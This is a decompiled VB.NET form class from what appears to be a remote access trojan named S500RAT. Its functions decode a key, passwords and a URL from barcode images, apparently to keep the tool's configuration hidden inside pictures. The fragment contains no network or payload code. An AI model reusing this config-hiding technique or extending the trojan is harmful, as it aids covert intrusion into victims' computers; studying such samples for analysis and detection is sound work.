Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.My
Imports ZXing

Namespace S500RAT
	' Token: 0x02000031 RID: 49
	<DesignerGenerated()>
	Public Partial Class FormSC
		Inherits Form

		' Token: 0x06000E3A RID: 3642 RVA: 0x0007EBD6 File Offset: 0x0007CDD6
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormSC_Load
			Me.InitializeComponent()
		End Sub

		' Token: 0x170005D3 RID: 1491
		' (get) Token: 0x06000E3D RID: 3645 RVA: 0x0007F285 File Offset: 0x0007D485
		' (set) Token: 0x06000E3E RID: 3646 RVA: 0x0007F28F File Offset: 0x0007D48F
		Friend Overridable Property PictureKey As PictureBox

		' Token: 0x170005D4 RID: 1492
		' (get) Token: 0x06000E3F RID: 3647 RVA: 0x0007F298 File Offset: 0x0007D498
		' (set) Token: 0x06000E40 RID: 3648 RVA: 0x0007F2A2 File Offset: 0x0007D4A2
		Friend Overridable Property GroupBox1 As GroupBox

		' Token: 0x170005D5 RID: 1493
		' (get) Token: 0x06000E41 RID: 3649 RVA: 0x0007F2AB File Offset: 0x0007D4AB
		' (set) Token: 0x06000E42 RID: 3650 RVA: 0x0007F2B5 File Offset: 0x0007D4B5
		Friend Overridable Property GroupBox2 As GroupBox

		' Token: 0x170005D6 RID: 1494
		' (get) Token: 0x06000E43 RID: 3651 RVA: 0x0007F2BE File Offset: 0x0007D4BE
		' (set) Token: 0x06000E44 RID: 3652 RVA: 0x0007F2C8 File Offset: 0x0007D4C8
		Friend Overridable Property PicturePass As PictureBox

		' Token: 0x170005D7 RID: 1495
		' (get) Token: 0x06000E45 RID: 3653 RVA: 0x0007F2D1 File Offset: 0x0007D4D1
		' (set) Token: 0x06000E46 RID: 3654 RVA: 0x0007F2DB File Offset: 0x0007D4DB
		Friend Overridable Property GroupBox3 As GroupBox

		' Token: 0x170005D8 RID: 1496
		' (get) Token: 0x06000E47 RID: 3655 RVA: 0x0007F2E4 File Offset: 0x0007D4E4
		' (set) Token: 0x06000E48 RID: 3656 RVA: 0x0007F2EE File Offset: 0x0007D4EE
		Friend Overridable Property PictureURL As PictureBox

		' Token: 0x170005D9 RID: 1497
		' (get) Token: 0x06000E49 RID: 3657 RVA: 0x0007F2F7 File Offset: 0x0007D4F7
		' (set) Token: 0x06000E4A RID: 3658 RVA: 0x0007F301 File Offset: 0x0007D501
		Friend Overridable Property GroupBox4 As GroupBox

		' Token: 0x170005DA RID: 1498
		' (get) Token: 0x06000E4B RID: 3659 RVA: 0x0007F30A File Offset: 0x0007D50A
		' (set) Token: 0x06000E4C RID: 3660 RVA: 0x0007F314 File Offset: 0x0007D514
		Friend Overridable Property PicturePassClient As PictureBox

		' Token: 0x06000E4D RID: 3661 RVA: 0x0007F31D File Offset: 0x0007D51D
		Private Sub FormSC_Load(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000E4E RID: 3662 RVA: 0x0007F320 File Offset: 0x0007D520
		Public Shared Function GetPickey() As Object
			Dim result As Object
			Try
				Dim barcodeReader As BarcodeReader = New BarcodeReader()
				result = barcodeReader.Decode(CType(MyProject.Forms.FormSC.PictureKey.Image, Bitmap)).ToString()
			Catch ex As Exception
				result = ""
			End Try
			Return result
		End Function

		' Token: 0x06000E4F RID: 3663 RVA: 0x0007F380 File Offset: 0x0007D580
		Public Shared Function GetPicpass() As Object
			Dim result As Object
			Try
				Dim barcodeReader As BarcodeReader = New BarcodeReader()
				result = barcodeReader.Decode(CType(MyProject.Forms.FormSC.PicturePass.Image, Bitmap)).ToString()
			Catch ex As Exception
				result = ""
			End Try
			Return result
		End Function

		' Token: 0x06000E50 RID: 3664 RVA: 0x0007F3E0 File Offset: 0x0007D5E0
		Public Shared Function GetPicurl() As Object
			Dim result As Object
			Try
				Dim barcodeReader As BarcodeReader = New BarcodeReader()
				result = barcodeReader.Decode(CType(MyProject.Forms.FormSC.PictureURL.Image, Bitmap)).ToString()
			Catch ex As Exception
				result = ""
			End Try
			Return result
		End Function

		' Token: 0x06000E51 RID: 3665 RVA: 0x0007F440 File Offset: 0x0007D640
		Public Shared Function GetPassClient() As Object
			Dim result As Object
			Try
				Dim barcodeReader As BarcodeReader = New BarcodeReader()
				result = barcodeReader.Decode(CType(MyProject.Forms.FormSC.PicturePassClient.Image, Bitmap)).ToString()
			Catch ex As Exception
				result = ""
			End Try
			Return result
		End Function
	End Class
End Namespace
